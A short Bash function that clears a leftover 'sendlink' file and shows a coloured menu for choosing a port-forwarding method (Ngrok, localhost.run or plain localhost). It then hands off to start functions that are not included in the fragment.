#!/usr/bin/env bash

tunnel_menu() {
    if [[ -e sendlink ]]; then
        rm -rf sendlink
    fi
        printf "\n"
        printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Localhost Run\e[0m\n"
        printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Localhost\e[0m\n"
        default_option_server="1"
        read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
        option_server="${option_server:-${default_option_server}}"
        if [[ $option_server == 1 || $option_server == 01 ]]; then
            start
            elif [[ $option_server == 2 || $option_server == 02 ]]; then
                start_local
                elif [[ $option_server == 3 || $option_server == 03 ]]; then
                start_l
                    else
                        printf "\e[1;93m [!] Invalid option!\e[0m\n"
                        sleep 1
                        clear
                        start1
                        fi
}